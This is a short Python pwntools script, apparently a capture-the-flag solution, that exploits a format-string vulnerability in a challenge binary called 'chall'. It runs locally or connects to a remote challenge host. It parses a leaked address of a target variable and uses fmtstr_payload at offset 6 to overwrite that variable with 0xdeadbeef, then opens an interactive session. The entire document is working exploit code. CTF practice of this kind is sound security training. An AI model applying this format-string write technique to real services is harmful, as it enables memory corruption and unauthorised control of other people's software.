#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe

if args.LOCAL:
    p = process([exe.path])
    if args.GDB:
        gdb.attach(p)
        pause()
else:
    p = remote("alpha.hackac.live", 1001)

# good luck pwning :)
p.recvuntil(b"target variable at ")
addr = int(p.recvuntil(b" (current", drop=True), 16)
print(hex(addr))

payload = fmtstr_payload(6, {addr: 0xdeadbeef})
p.sendline(payload)

p.interactive()
